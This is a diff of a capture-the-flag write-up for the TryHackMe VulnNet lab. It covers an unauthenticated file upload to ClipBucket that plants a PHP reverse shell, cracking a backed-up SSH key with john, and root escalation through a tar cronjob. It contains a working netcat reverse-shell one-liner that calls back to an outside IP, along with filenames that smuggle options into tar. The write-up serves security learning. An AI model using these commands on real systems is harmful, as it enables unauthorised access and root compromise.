@@ -36,7 +36,7 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 - on accessing the website `broadcast.vulnnet.thm` we see that it uses `clipbucket 4.0`
 - This version has a exploit available on `searchsploit`, we can upload a file without authentication
-Follow the instructions in the exploit and upload a php revshell 
+Follow the instructions in the exploit and upload a php [[revshell]]
 
 Open a listener (`nc -nlvp 4444`) and browse the uploaded shell `http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1620367741f6065c.php`.
 ### Lateral movement
@@ -49,10 +49,45 @@ Let’s check what files are owned by this user [[Find]]
 find / -type f -user server-management -exec ls -l {} + 2>/dev/null
 ```
 
-this user owns a zip file in the `/var/backup` directory 
+this user owns a zip file in the `/var/backup` directory, copy the file to your machine
+```
+cp /var/backup/ssh-backup.tar.gz /tmp
+cd /tmp
+tar xvf ssh-backup.tar.gz
+```
 
+convert the file to something that [[john]] will understand 
+```
+python /usr/share/john/ssh2john.py id_rsa > ssh.hash
+```
 
+then crack the hash using john
 
+### Priv esc
+
+after gettting the hash [[ssh (22 port)]] as the user 
+```sh
+ssh -i id_rsa server-management@vulnnet.thm
+```
+
+There is a [[cronjob]] (`/var/opt/backupsrv.sh`) run by `root` every 2 minutes
+We don’t have write access to the script.
+
+The script is backing up our `Documents` folder using `tar` to compress the archive.
+
+Checking on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) what we can do with `tar` confirms that we can exploit it by creating 2 files which names will be interpreted as options passed to the `tar` command.
+
+create a revshell using the pentest monkey revshell.
+
+```sh
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.50.72 4444 >/tmp/f" > /home/server-management/Documents/rev.sh
+
+touch "/home/server-management/Documents/--checkpoint=1"
+
+touch "/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh"
+```
+
+start a listener then wait for the cronjob to run.
 
 ### References
 [TryHackMe | VulnNet](https://tryhackme.com/r/room/vulnnet1)
